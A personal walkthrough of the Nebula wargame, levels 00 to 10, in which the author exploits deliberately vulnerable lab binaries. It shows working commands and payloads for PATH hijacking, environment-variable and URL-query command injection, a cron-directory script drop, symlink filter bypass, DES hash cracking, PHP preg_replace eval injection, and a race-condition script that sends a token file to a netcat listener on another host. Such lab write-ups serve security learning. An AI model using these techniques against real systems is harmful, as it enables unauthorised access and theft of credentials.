Exploit-Exercises: Nebula


Level 00

Level 0 is trying to just get you to figure out how to get around the shell. If you don't know how to use *find*, that's what it's teaching you.

Since this is supposed to be running "flag00", I simply tried that as a search first:

`find / -name *flag00*`

And I found the wonderfully suspicious directory /bin/.../ with the executable "flag00". Running that made me "flag00" user, and getflag gave me the flag. Mission accomplished in less than a minute.



Level 01

The trick in this C code is the `system` call. Note what it is spawning using /bin/sh:

/usr/bin/env echo and now what?

/usr/bin/env is "env", which will use the current environment to make changes. If we can trick `env` into using an arbitrary `echo`, we have code execution as the user. Checking ~/.profile there's a line that automatically appends ~/bin as the first place to look on $PATH, so I just added a directory `~/bin` and symlinked `echo` to `/bin/getflag`.

```
mkdir ~/bin
cd ~/bin
ln -s /bin/getflag echo
bash --login
cd /home/flag01
./flag01
```

aand pwned.


Level 02

Looking at this code it's easy to see what I need to do: somehow wrangle $USER into an arbitrary shell string I can execute. First I tried:

```
set USER="; /bin/getflag"
./flag02
```

... but $USER would be reset on the next line by the shell to `level02`. So inlining the env var:

`USER="; /bin/getflag" ./flag02`

executed the flag. Boom. Pwned.


Level 03

OK, so look at `writable.sh`. It's running through writable.d, running each file, and then deleting it on some type of cronjob according to the instructions. So really I just need to dump out some information using a shell script or the like in `/home/flag03/writable.d`. So first I wrote a script to test it's working:

```
#!/bin/bash

echo "test this mess" > /home/flag03/test
```

This ran, and `ls -l` showed the executing user and group as `flag03:flag03`. Easy peasy now. Next script in `/home/flag03/writable.d`:

```
#!/bin/bash

/bin/getflag > /home/flag03/flag_result
```

`watch -n 30 ls` in `/home/flag03`, and eventually I saw flag_result pop up. `cat flag_result`? pwned.


Level 04

This uses a simple sanity check. `strstr` checks to see if my argument contains the name "token" anywhere in it. If it does, it stops me from reading the file. Since I don't have permission to actually read `token` as-is, I just created a symbolic link to `/home/flag04/token` as `/home/level04/lnto` and used `./flag04 /home/level04/lnto` to bypass the sanity check on the filename. Pwned.

`06508b5e-8909-4f38-b640-fdb148a848a2`

This token is the password to user `flag04`. `su flag04`, enter the token, and boom shaka laka, `getflag` works.


Level 05

This one was easy with the hint.

`ls -la` shows a hidden directory `.backup`, which is world-readable. In there is a .tgz file. I copied the `.tgz` file to my home directory and extracted it, giving me an SSH keypair. `ssh -i id_rsa flag05@localhost` and I'm in as flag05 user. `getflag`, and pwned.


Level 06

"The flag06 account credentials came from a legacy UNIX system." Yep, OK.

`cat /etc/passwd | grep flag06` gives me an old hash, which I assume is broken.

`flag06:ueqwOCnSGdsUM:993:994::/home/flag06/bin/sh`

This should be in `/etc/shadow` but it ain't. So I have the password hash? Threw it into oclHashcat. I recently lost my hard drive with all of my dictionaries on it, so I went for a lame-o bruteforce waiting for new ones to download, then... hey! Let's just try oclHashcat's example dict. From a little googling, this is `descrypt`.

`oclHashcat64.exe -m 1500 -d 1 -a 0 ueqwOCnSGdsuM example.dict`

smashed out by one of my 7970s in less than a second as `hello`.

```
su flag06
password: hello
getflag
```

pwned.


Level 07

Finally, into the web. `less /home/flag07/thttpd.conf` shows me this is running on port 7007.

This is cake. I have RCE through the Host GET variable, all I need to do is escape the shit. Opened the iceweasel console and then used `encodeURIComponent` to get a properly formatted escape sequence.

`encodeURIComponent('; getflag #');` gives me `%3B%20getflag%20%23`.

`10.0.29.5:7007/index.cgi?Host=%3B%20getflag%20%23` and... `You have successfully executed getflag on a target account.`


Level 08

I copied the world-readable .pcap file into `~`, then SCPed it to Kali for my Wireshark instance. Bringing it into Wireshark, I opened it and just went through packet by packet first, seeing it looked like plaintext login. Using Wireshark's "Follow TCP Stream", I got it to come together, and ended up with

```
Password: backdoor...00Rm8.ate
```

... If the escaped ASCII `.` is backspace, with the password `backd00Rmate`, `su flag08` opens right up. `getflag`.


Level 09

Looking at the PHP code there is an `e` extension to the regex, which triggers [PREG_REPLACE_EVAL](http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php). Hey, arbitrary code execution, kinda! And the PHP docs tell you how this works and why it's bad.

To exploit, I created a text file `~/corpus` with the bypass in the regex to it, after getting it to do what it's supposed to. Must be the engineer in me that tries to figure out "ok, so what is this *supposed* to do" before "how can i fuck this up hard?"

```
[email {${eval(<CODE HERE>)}}]
```

But the problem is that I have to compete with `addslashes` in that eval(), because PREG_REPLACE_EVAL tries to be nice and addslash anything that's a string literal. I couldn't figure out why I had `$argv[2]` and `$use_me`, until, well, I made like Alice at the rabbit hole and understood what `$use_me` was for. So I finished my exploit:


```
[email {${eval($use_me)}}]
```

... and now I can input my PHP code as `$argv[2]` right on the command line. Using `bash`:

`./flag09 ~/corpus "return system('/bin/getflag')"`

and pwned.


Level 10

We're starting to play with sockets. I've got something that will remote off a file to a host, assuming it has access to the host.

So first I need to set up something listening on my local machine. Given the port on line 38 of the C code:

`nc -l -k -p 18211`

Sets up a listener on my local machine `10.0.29.4`. I tested my listener by making a file `~/testfile` with the text `this is a test file`, and then executed `./flag10 ~/testfile 10.0.29.4`. Sure enough, I see it via `nc` with a header `.oO Oo.`.

My guess is that I have to exploit the race condition as described in the [access(2)](http://linux.die.net/man/2/access) documentation. Get past `access` with an OK check, and then change the file to a symlink upon it being accessed.

The `open()` call is on line 54, well below `connect()`. If I can manipulate network latency and not timeout I could manually swap the files around. I could use `tc` if I was root to induce network latency or make a really slow connection. I first tried to get inotify to pay attention to changes, but I couldn't get it to reliably work at all on any pre-existing file, after much poking around, so I gave up on that.

Instead, I'll go for the whole network latency bit, and hope I can make connect() timeout change. I found [this guy's blog on adding network latency](http://sys-log.bencane.com/2012/07/tc-adding-simulated-network-latency-to-your-linux-server/) which I did to my Kali instance running the listener:

`tc qdisc add dev eth1 root netem delay 1000ms`

which gives me a full second to swap the files out, which should be way more than enough to instantiate the race condition. Back on the nebula VM, I wrote a ghetto python script that will run the first one in the background and swap out the others:

```
import time, os
import subprocess

os.system('rm /home/level10/x; touch /home/level10/x')
p=subprocess.Popen("/home/flag10/flag10 /home/level10/x 10.0.29.4", shell=True, stdout=subprocess.PIPE)
time.sleep(0.1)
subprocess.Popen("rm /home/level10/x; ln -s /home/flag10/token /home/level10/x", shell=True)
out, err = p.communicate()
print out
```

Running this and watching my netcat instance...

```
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```

Boom. Race condition pwnage. Back to the VM after I remove the delay with `tc qdisc del dev eth1 root netem`:

```
su flag10
Password: <the GUID>
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

This one took me a good 2 hours longer than it should have because I got caught up in trying to get `inotify` to work, when network latency was all I needed. `tc` helped me make `netcat` respond slow enough to create the race condition 100% of the time.
Had I gone with the network latency path the first time I would've had this in about half an hour.

